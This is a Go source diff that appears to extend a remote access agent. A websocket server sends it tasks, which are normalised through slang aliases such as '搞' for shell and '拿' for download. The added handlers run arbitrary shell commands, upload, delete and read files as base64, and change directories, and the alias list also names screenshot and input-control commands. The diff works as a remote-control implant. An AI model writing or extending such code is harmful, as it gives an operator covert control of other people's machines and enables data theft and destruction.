@@ -117,8 +117,43 @@ func connect() error {
 	}
 }
 
+func normalizeType(t string) string {
+	t = strings.ToLower(t)
+	switch t {
+	case "ls", "list", "列出", "列表", "file_ls", "目录", "看":
+		return "file_ls"
+	case "upload", "上传", "file_upload", "up", "传":
+		return "file_upload"
+	case "delete", "remove", "删除", "移除", "file_delete", "rm", "删":
+		return "file_delete"
+	case "shell", "exec", "run", "执行", "运行", "cmd", "sh", "搞":
+		return "shell"
+	case "cd", "切换目录", "进", "去":
+		return "cd"
+	case "download", "下载", "file_download", "dl", "拿":
+		return "file_download"
+	case "mkdir", "创建目录", "md", "建":
+		return "file_mkdir"
+	case "read", "读取文件", "cat", "读":
+		return "file_read"
+	case "screenshot", "截图", "拍":
+		return "screenshot"
+	case "app_control", "控制应用":
+		return "app_control"
+	case "input", "输入":
+		return "input"
+	case "sys_info", "系统信息", "机子":
+		return "sys_info"
+	case "sleep", "睡眠", "歇":
+		return "sleep"
+	default:
+		return t
+	}
+}
+
 func handleTask(c *websocket.Conn, msg Message) {
-	switch msg.Type {
+	msgType := normalizeType(msg.Type)
+	switch msgType {
 	case "ping":
 		sendResp(c, "pong", "alive", "")
 
@@ -226,16 +261,93 @@ func handleTask(c *websocket.Conn, msg Message) {
 		os.Remove(tempFile)
 
 	case "file_ls":
-		files, err := os.ReadDir(msg.Payload)
+		path := msg.Payload
+		if path == "" {
+			path = "."
+		}
+		files, err := os.ReadDir(path)
 		if err != nil {
 			sendResp(c, "fail", nil, err.Error())
 			return
 		}
 		var fileList []string
 		for _, f := range files {
-			fileList = append(fileList, f.Name())
+			name := f.Name()
+			if f.IsDir() {
+				name += "/"
+			}
+			fileList = append(fileList, name)
 		}
 		sendResp(c, "ok", fileList, "")
+
+	case "file_upload":
+		// Payload 格式: "filename|base64_content"
+		parts := strings.SplitN(msg.Payload, "|", 2)
+		if len(parts) < 2 {
+			sendResp(c, "fail", nil, "Upload requires filename and content (format: filename|base64)")
+			return
+		}
+		filename := parts[0]
+		content, err := base64.StdEncoding.DecodeString(parts[1])
+		if err != nil {
+			sendResp(c, "fail", nil, "Base64 decode error: "+err.Error())
+			return
+		}
+		err = os.WriteFile(filename, content, 0644)
+		if err != nil {
+			sendResp(c, "fail", nil, err.Error())
+		} else {
+			sendResp(c, "ok", fmt.Sprintf("File %s uploaded (%d bytes)", filename, len(content)), "")
+		}
+
+	case "file_delete":
+		err := os.RemoveAll(msg.Payload)
+		if err != nil {
+			sendResp(c, "fail", nil, err.Error())
+		} else {
+			sendResp(c, "ok", "Deleted: "+msg.Payload, "")
+		}
+
+	case "shell":
+		var cmd *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("cmd", "/C", msg.Payload)
+		} else {
+			cmd = exec.Command("sh", "-c", msg.Payload)
+		}
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			sendResp(c, "fail", string(output), err.Error())
+		} else {
+			sendResp(c, "ok", string(output), "")
+		}
+
+	case "cd":
+		err := os.Chdir(msg.Payload)
+		if err != nil {
+			sendResp(c, "fail", nil, err.Error())
+		} else {
+			dir, _ := os.Getwd()
+			sendResp(c, "ok", "Changed directory to: "+dir, "")
+		}
+
+	case "file_mkdir":
+		err := os.MkdirAll(msg.Payload, 0755)
+		if err != nil {
+			sendResp(c, "fail", nil, err.Error())
+		} else {
+			sendResp(c, "ok", "Directory created: "+msg.Payload, "")
+		}
+
+	case "file_read":
+		content, err := os.ReadFile(msg.Payload)
+		if err != nil {
+			sendResp(c, "fail", nil, err.Error())
+		} else {
+			// 如果是文本则尝试直接返回，否则返回 Base64
+			encoded := base64.StdEncoding.EncodeToString(content)
+			sendResp(c, "ok", encoded, "")
+		}
 
 	case "file_download":
 		// Payload 格式: "http://url|C:\dest\path"
